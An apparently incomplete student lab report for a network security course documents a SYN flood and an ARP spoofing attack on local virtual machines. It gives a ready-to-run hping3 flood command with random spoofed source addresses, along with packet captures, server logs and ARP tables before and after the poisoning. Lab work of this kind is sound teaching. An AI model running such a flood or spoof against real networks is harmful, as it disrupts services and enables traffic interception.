# CENG489 PA2

This report is intended to explain the process and results of the attacks made in different settings for the sake of the assignment. For the ease of readability and grading, the report is divided into sections, each for one single attack.

## Attack 1: SYN Flood

### Description

### Attack Scenario

#### Network Topology

#### Attack Process

```bash
python3 scripts/01-syn-flood/server.py
```

```bash
python3 scripts/01-syn-flood/client.py
```

```bash
sudo hping3 -c 150000 -d 120 -S -w 64 -p 4444 --flood --rand-source 192.168.56.101
```

```bash
sudo tcpdump -i enp0s8 -w 01-syn-flood-attacker.pcap -s 96
```

```bash
sudo tcpdump -i enp0s8 -w 01-syn-flood-server.pcap -s 96
```

```bash
serving at port 4444
192.168.56.102 - - [21/Jun/2022 14:05:46] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:47] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:49] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:50] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:51] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:52] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:53] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:54] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:55] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:56] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:57] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:58] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:05:59] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:00] "GET / HTTP/1.1" 200 - # Attack starts here
192.168.56.102 - - [21/Jun/2022 14:06:02] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:04] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:05] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:12] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:33] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:36] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:39] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:06:41] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:07:01] "GET / HTTP/1.1" 200 -
192.168.56.102 - - [21/Jun/2022 14:07:02] "GET / HTTP/1.1" 200 -
```

![](images/01_attacker.png)

![](images/01_server.png)

### Results

## Attack 2: ARP Spoofing

### Description

### Attack Scenario

#### Network Topology

#### Attack Process

Before the attack:

```bash
vagrant@client:~$ arp -a
? (192.168.56.100) at 08:00:27:03:7e:13 [ether] on enp0s8
? (192.168.56.101) at 08:00:27:11:bd:83 [ether] on enp0s8
_gateway (10.0.2.2) at 52:54:00:12:35:02 [ether] on enp0s3
? (10.0.2.3) at 52:54:00:12:35:03 [ether] on enp0s3
```

After the attack:

```bash
vagrant@client:~$ arp -a
? (192.168.56.100) at 08:00:27:03:7e:13 [ether] on enp0s8
? (192.168.56.101) at 08:00:27:03:7e:13 [ether] on enp0s8
_gateway (10.0.2.2) at 52:54:00:12:35:02 [ether] on enp0s3
? (10.0.2.3) at 52:54:00:12:35:03 [ether] on enp0s3
```

![](images/02-attacker-poisoning.png)

It can be seen that before the attack, client sends the HTTP request packets to the server with the MAC address `08:00:27:11:bd:83`:

![](images/02-client-before-poisoning.png)

Also, after the spoofing, client starts sending the same HTTP packets to the server but with MAC address `08:00:27:03:7e:13`:

![](images/02-client-after-poisoning.png)

### Results

## APPENDIX

### Repository Structure

